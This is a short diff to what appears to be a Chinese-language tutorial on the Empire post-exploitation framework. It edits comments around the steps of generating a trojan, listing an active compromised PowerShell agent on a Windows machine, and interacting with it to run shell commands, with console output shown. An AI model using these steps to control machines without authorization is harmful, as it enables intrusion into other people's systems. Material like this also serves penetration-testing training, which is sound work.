@@ -67,7 +67,7 @@ execute			# set生效，生成木马文件
 
 # 会显示被攻击级器的IP
 
-# 使用agents
+# 使用agents，查看代理或者目标
 agents
 
 [*] Active agents:
@@ -76,7 +76,7 @@ agents
  ----     -- -----------     ------------      --------                -------            ---    -----    ---------
  NCU84961 ps 192.168.11.1    DESKTOP-S8B7MSP   DESKTOP-S8B7MSP\R-web   powershell         1968   5/0.0    2019-05-03 17:59:53
 
-(Empire: agents) > interact NCU84961
+连接目标interact NCU84961
 (Empire: NCU84961) > dir
 [*] Tasked NCU84961 to run TASK_SHELL
 [*] Agent NCU84961 tasked with task ID 1
